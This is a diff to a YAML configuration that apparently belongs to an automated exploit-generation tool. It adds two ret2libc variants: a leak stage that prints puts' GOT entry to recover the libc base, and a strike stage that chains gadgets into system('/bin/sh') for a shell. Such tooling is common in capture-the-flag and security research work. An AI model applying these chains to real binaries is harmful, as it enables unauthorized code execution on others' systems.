@@ -87,9 +87,19 @@ ret2plt_leak:
 
 ret2libc:
   arch: any
-  layout:
-    - [padding, measured_offset]
-    - [chain, "gadget:ret_align", "gadget:pop_rdi_ret", "leak:binsh", "leak:system"]
+  variants:
+    # the strike: the full system("/bin/sh") chain - it needs the
+    # leak facts the exploit's leak round (or a harvest) supplies
+    - name: strike
+      layout:
+        - [padding, measured_offset]
+        - [chain, "gadget:ret_align", "gadget:pop_rdi_ret", "leak:binsh", "leak:system"]
+    # the leak round: puts(GOT[puts]) prints the raw libc pointer -
+    # the strike derives the libc base from what answers
+    - name: leak_stage
+      layout:
+        - [padding, measured_offset]
+        - [chain, "gadget:pop_rdi_ret", "got_addr:puts", "plt_addr:puts"]
 orw:
   arch: any
   layout:
